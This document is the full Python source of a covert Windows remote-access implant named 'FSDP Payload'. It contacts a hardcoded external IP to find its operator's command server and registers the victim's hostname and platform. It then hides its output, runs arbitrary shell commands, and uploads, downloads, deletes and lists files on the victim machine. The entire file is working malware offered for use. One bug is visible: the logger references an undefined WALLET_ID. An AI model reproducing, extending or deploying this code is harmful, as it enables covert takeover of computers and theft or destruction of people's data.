#!/usr/bin/env python3
# FSDP Payload - HD Wallet System
# Platform: Windows/x64
# Payload Wallet: admin-b62ef7f6/001-f07273bd

import sys
import os
import json
import time
import socket
import subprocess
import platform
import uuid
import threading
from datetime import datetime
from pathlib import Path
try:
    import urllib.request
    import urllib.parse
except ImportError:
    print("Error: urllib not available")
    sys.exit(1)

DEBUG = False  # Set to False to hide all terminal output
PAYLOAD_WALLET = "admin-b62ef7f6/001-f07273bd"  # HD-derived child wallet

# Blockchain-Based Discovery
# Admin publishes location to blockchain, payload reads from blockchain
BLOCKCHAIN_API = "http://38.89.139.10:5000"  # Admin's blockchain HTTP API

class Logger:
    def __init__(self):
        self.debug = DEBUG
        self.log_file = None
        if DEBUG:
            try:
                log_dir = Path.home() / ".fsdp_logs"
                log_dir.mkdir(exist_ok=True)
                self.log_file = log_dir / f"payload_{WALLET_ID[:8]}.log"
            except:
                pass
    
    def log(self, m):
        l = f"[{datetime.now().strftime('%H:%M:%S')}] {m}"
        if self.debug:
            print(l)
        if self.log_file:
            try:
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(l + '\n')
            except:
                pass

logger = Logger()

# ==================================================================
# BLOCKCHAIN-BASED DISCOVERY
# ==================================================================

def discover_admin_via_blockchain(admin_wallet, blockchain_api):
    """Discover admin location by querying blockchain"""
    try:
        logger.log(f"🔍 Querying blockchain for admin wallet...")
        logger.log(f"  Blockchain API: {blockchain_api}")
        logger.log(f"  Target wallet: {admin_wallet}")
        
        # Query blockchain's /discover_wallet endpoint
        url = f"{blockchain_api}/discover_wallet?wallet_id={admin_wallet}"
        req = urllib.request.Request(url, headers={'User-Agent': 'FSDP-Payload/1.0'})
        resp = urllib.request.urlopen(req, timeout=10)
        data = json.loads(resp.read().decode())
        
        if data.get('found'):
            ip = data.get('ip')
            port = data.get('port')
            logger.log(f"  ✓ Admin found!")
            logger.log(f"  IP: {ip}")
            logger.log(f"  Port: {port}")
            return {
                'ip': ip,
                'port': port,
                'wallet_id': data.get('wallet_id')
            }
        else:
            logger.log(f"  ✗ Admin wallet not found in blockchain")
            return None
            
    except Exception as e:
        logger.log(f"  Blockchain query failed: {e}")
        return None

class BlockchainClient:
    def __init__(self, api_url, wallet_id):
        self.api_url = api_url
        self.wallet_id = wallet_id
        self.session_id = str(uuid.uuid4())
        self.running = False
        self.last_block = 0
        self.processed_messages = set()  # Track processed message IDs
        self.current_dir = os.getcwd()  # Persistent working directory
        self.env = os.environ.copy()  # Persistent environment
        logger.log(f"Wallet: {wallet_id[:16]}...")
        logger.log(f"Initial directory: {self.current_dir}")
    
    def connect(self):
        logger.log(f"Connecting to {self.api_url}")
        self.running = True
        
        # Register
        self.submit_transaction({
            'type': 'session_register',
            'from': self.wallet_id,
            'to': 'admin',
            'data': {
                'session_id': self.session_id,
                'target_info': {
                    'platform': platform.system(),
                    'architecture': platform.machine(),
                    'hostname': socket.gethostname(),
                    'python_version': platform.python_version()
                }
            },
            'message_id': str(uuid.uuid4())
        })
        logger.log(f"Session registered: {self.session_id[:16]}...")
        
        # Start listener
        threading.Thread(target=self.listen, daemon=True).start()
        threading.Thread(target=self.heartbeat, daemon=True).start()
    
    def submit_transaction(self, tx):
        try:
            data = json.dumps({'transaction': tx}).encode()
            req = urllib.request.Request(f"{self.api_url}/submit_transaction", data=data, 
                                        headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req, timeout=5)
            logger.log(f"TX: {tx['type']}")
        except Exception as e:
            logger.log(f"TX error: {e}")
    
    def get_transactions(self):
        try:
            url = f"{self.api_url}/get_transactions?node_id={self.wallet_id}&since_block={self.last_block}"
            resp = urllib.request.urlopen(url, timeout=5)
            data = json.loads(resp.read().decode())
            return data.get('transactions', [])
        except:
            return []
    
    def listen(self):
        logger.log("Listening for commands...")
        while self.running:
            try:
                txs = self.get_transactions()
                for tx in txs:
                    self.process_transaction(tx)
                    if 'block_index' in tx:
                        self.last_block = max(self.last_block, tx['block_index'])
                time.sleep(1)
            except Exception as e:
                logger.log(f"Listen error: {e}")
                time.sleep(5)
    
    def process_transaction(self, tx):
        # Check for duplicate messages
        message_id = tx.get('message_id')
        if message_id in self.processed_messages:
            return  # Already processed, skip
        
        # Mark as processed
        if message_id:
            self.processed_messages.add(message_id)
            # Keep only last 1000 message IDs to prevent memory growth
            if len(self.processed_messages) > 1000:
                self.processed_messages = set(list(self.processed_messages)[-500:])
        
        tx_type = tx.get('type')
        data = tx.get('data', {})
        
        if tx_type == 'terminal_command':
            command = data.get('command')
            if command:
                logger.log(f"Executing: {command}")
                output, exit_code = self.execute_command(command)
                
                # Send output back
                self.submit_transaction({
                    'type': 'terminal_output',
                    'from': self.wallet_id,
                    'to': 'admin',
                    'data': {
                        'session_id': self.session_id,
                        'output': output,
                        'exit_code': exit_code
                    },
                    'message_id': str(uuid.uuid4())
                })
        
        elif tx_type == 'file_list':
            # List files in directory
            path = tx.get('path', '/')
            logger.log(f"Listing files: {path}")
            files = self.list_files(path)
            
            self.submit_transaction({
                'type': 'file_list_response',
                'from': self.wallet_id,
                'to': 'admin',
                'data': {
                    'session_id': self.session_id,
                    'path': path,
                    'files': files
                },
                'session_id': self.session_id,
                'path': path,
                'files': files,
                'message_id': str(uuid.uuid4())
            })
        
        elif tx_type == 'file_upload':
            # Receive and save file
            filename = tx.get('filename')
            remote_path = tx.get('remote_path')
            file_data = tx.get('data', '')
            
            logger.log(f"Receiving file: {filename}")
            success = self.save_file(remote_path, file_data)
            logger.log(f"File saved: {success}")
        
        elif tx_type == 'file_download':
            # Send file to admin
            remote_path = tx.get('remote_path')
            filename = tx.get('filename')
            
            logger.log(f"Sending file: {remote_path}")
            file_data = self.read_file(remote_path)
            
            self.submit_transaction({
                'type': 'file_download_response',
                'from': self.wallet_id,
                'to': 'admin',
                'data': {
                    'session_id': self.session_id,
                    'filename': filename,
                    'data': file_data
                },
                'session_id': self.session_id,
                'filename': filename,
                'data': file_data,
                'message_id': str(uuid.uuid4())
            })
        
        elif tx_type == 'file_delete':
            # Delete file
            remote_path = tx.get('remote_path')
            logger.log(f"Deleting: {remote_path}")
            self.delete_file(remote_path)
        
        elif tx_type == 'file_mkdir':
            # Create directory
            remote_path = tx.get('remote_path')
            logger.log(f"Creating directory: {remote_path}")
            self.create_directory(remote_path)
    
    def list_files(self, path):
        """List files in directory"""
        try:
            import os
            from datetime import datetime
            
            # Handle empty or invalid paths
            if not path or path == '':
                path = self.current_dir
            
            # Handle Windows drive letter format (C: -> C:\)
            if len(path) == 2 and path[1] == ':':
                path = path + '\\'
            
            # Normalize path
            path = os.path.normpath(path)
            
            # Check if path exists
            if not os.path.exists(path):
                logger.log(f"Path does not exist: {path}")
                return []
            
            logger.log(f"Listing directory: {path}")
            
            files = []
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                try:
                    stat = os.stat(item_path)
                    files.append({
                        'name': item,
                        'is_dir': os.path.isdir(item_path),
                        'size': stat.st_size,
                        'modified': datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M')
                    })
                except Exception as ex:
                    logger.log(f"Error reading {item}: {ex}")
                    pass
            
            # Sort: directories first, then files
            files.sort(key=lambda x: (not x['is_dir'], x['name'].lower()))
            logger.log(f"Found {len(files)} items")
            return files
        except Exception as e:
            logger.log(f"List files error: {e}")
            return []
    
    def save_file(self, path, data_b64):
        """Save uploaded file"""
        try:
            import base64
            file_data = base64.b64decode(data_b64)
            
            # Create directory if needed
            os.makedirs(os.path.dirname(path), exist_ok=True)
            
            with open(path, 'wb') as f:
                f.write(file_data)
            
            return True
        except Exception as e:
            logger.log(f"Save file error: {e}")
            return False
    
    def read_file(self, path):
        """Read file for download"""
        try:
            import base64
            with open(path, 'rb') as f:
                file_data = f.read()
            return base64.b64encode(file_data).decode()
        except Exception as e:
            logger.log(f"Read file error: {e}")
            return ''
    
    def delete_file(self, path):
        """Delete file or directory"""
        try:
            if os.path.isdir(path):
                os.rmdir(path)
            else:
                os.remove(path)
            return True
        except Exception as e:
            logger.log(f"Delete error: {e}")
            return False
    
    def create_directory(self, path):
        """Create directory"""
        try:
            os.makedirs(path, exist_ok=True)
            return True
        except Exception as e:
            logger.log(f"Create directory error: {e}")
            return False
    
    def execute_command(self, cmd):
        try:
            cmd_lower = cmd.strip().lower()
            
            # Handle cd command specially for persistent directory
            # Support: cd, cd.., cd .., cd path, cd\path
            if cmd_lower.startswith('cd') and (
                cmd_lower == 'cd' or 
                cmd_lower.startswith('cd ') or 
                cmd_lower.startswith('cd..') or 
                cmd_lower.startswith('cd\\') or
                cmd_lower.startswith('cd/')
            ):
                return self._handle_cd(cmd.strip())
            
            # Handle pwd for current directory (works on Windows too now)
            if cmd_lower == 'pwd':
                return self.current_dir + '\n', 0
            
            # Execute command in persistent current directory
            result = subprocess.run(
                cmd, 
                shell=True, 
                capture_output=True, 
                timeout=60,
                cwd=self.current_dir,  # Use persistent directory!
                env=self.env
            )
            output = result.stdout.decode('utf-8', errors='ignore')
            if result.stderr:
                output += result.stderr.decode('utf-8', errors='ignore')
            return output, result.returncode
        except Exception as e:
            return f"Error: {str(e)}", -1
    
    def _handle_cd(self, cmd):
        """Handle cd command with persistent directory"""
        try:
            # Handle different cd formats: "cd ", "cd..", "cd\", "cd/"
            cmd_clean = cmd.strip()
            
            # Remove "cd" prefix
            if cmd_clean.lower() == 'cd':
                # Just "cd" - go to home
                new_dir = str(Path.home())
            elif cmd_clean.lower() == 'cd..':
                # "cd.." - go up one directory
                new_dir = str(Path(self.current_dir).parent)
            elif cmd_clean.lower().startswith('cd '):
                # "cd path" - normal format
                path = cmd_clean[3:].strip()
                new_dir = self._resolve_path(path)
            elif cmd_clean.lower().startswith('cd\\') or cmd_clean.lower().startswith('cd/'):
                # "cd\path" or "cd/path" - Windows format
                path = cmd_clean[2:].strip()
                new_dir = self._resolve_path(path)
            else:
                return f"Invalid cd command: {cmd}", 1
            
            # Check if directory exists
            if os.path.isdir(new_dir):
                self.current_dir = new_dir
                logger.log(f"Changed directory to: {new_dir}")
                return f"{new_dir}", 0
            else:
                return f"The system cannot find the path specified.", 1
                
        except Exception as e:
            return f"Error: {str(e)}", 1
    
    def _resolve_path(self, path):
        """Resolve relative or absolute path"""
        if path == '~':
            return str(Path.home())
        elif path == '..':
            return str(Path(self.current_dir).parent)
        elif path == '.':
            return self.current_dir
        elif os.path.isabs(path):
            return path
        else:
            return os.path.abspath(os.path.join(self.current_dir, path))
    
    def heartbeat(self):
        while self.running:
            self.submit_transaction({
                'type': 'heartbeat',
                'from': self.wallet_id,
                'to': 'admin',
                'data': {'session_id': self.session_id},
                'message_id': str(uuid.uuid4())
            })
            time.sleep(30)

if __name__ == "__main__":
    # Suppress all terminal output (run silently in background)
    if not DEBUG:
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')
    
    try:
        if DEBUG:
            print("="*60)
            print("FSDP Payload Starting (Blockchain Discovery)")
            print(f"Payload Wallet: {PAYLOAD_WALLET[:24]}...")
            print(f"Platform: {platform.system()}/{platform.machine()}")
            print(f"Hostname: {socket.gethostname()}")
            print(f"Blockchain: {BLOCKCHAIN_API}")
            print("="*60)
        
        logger.log("="*60)
        logger.log("FSDP Payload Started (Blockchain Discovery)")
        logger.log(f"Payload Wallet: {PAYLOAD_WALLET}")
        logger.log(f"Platform: {platform.system()}/{platform.machine()}")
        logger.log(f"Hostname: {socket.gethostname()}")
        logger.log(f"Blockchain: {BLOCKCHAIN_API}")
        logger.log("="*60)
        
        # Extract master wallet from child wallet
        master_wallet = PAYLOAD_WALLET.split('/')[0] if '/' in PAYLOAD_WALLET else None
        
        if not master_wallet:
            if DEBUG:
                print("\nERROR: Invalid payload wallet format!")
                input("Press Enter to exit...")
            logger.log("ERROR: Could not extract master wallet")
            sys.exit(1)
        
        if DEBUG:
            print(f"\nMaster wallet: {master_wallet}")
            print("Discovering admin via blockchain...")
        
        # Query blockchain for admin location
        connection_info = discover_admin_via_blockchain(master_wallet, BLOCKCHAIN_API)
        
        if not connection_info:
            if DEBUG:
                print("\nERROR: Could not find admin in blockchain!")
                print("Make sure admin is online and validator is running.")
                input("Press Enter to exit...")
            logger.log("ERROR: Admin wallet not found in blockchain")
            sys.exit(1)
        
        # Extract connection info
        api_url = f"http://{connection_info.get('ip')}:{connection_info.get('port')}"
        
        if DEBUG:
            print(f"Admin found at: {api_url}")
            print("\nInitializing blockchain client...")
        client = BlockchainClient(api_url, PAYLOAD_WALLET)
        
        if DEBUG:
            print("Connecting to API...")
        client.connect()
        
        if DEBUG:
            print("Connected! Payload running...")
            print("Press Ctrl+C to stop\n")
        logger.log("Payload running - Press Ctrl+C to stop...")
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        if DEBUG:
            print("\nInterrupted by user")
        logger.log("Interrupted by user")
        sys.exit(0)
    except Exception as e:
        error_msg = f"FATAL ERROR: {e}"
        if DEBUG:
            print("\n" + "="*60)
            print(error_msg)
            print("="*60)
        import traceback
        tb = traceback.format_exc()
        if DEBUG:
            print(tb)
        logger.log(error_msg)
        logger.log(tb)
        if DEBUG:
            print("\nCheck logs at: %USERPROFILE%\\.fsdp_logs\\")
            input("\nPress Enter to exit...")
        sys.exit(1)
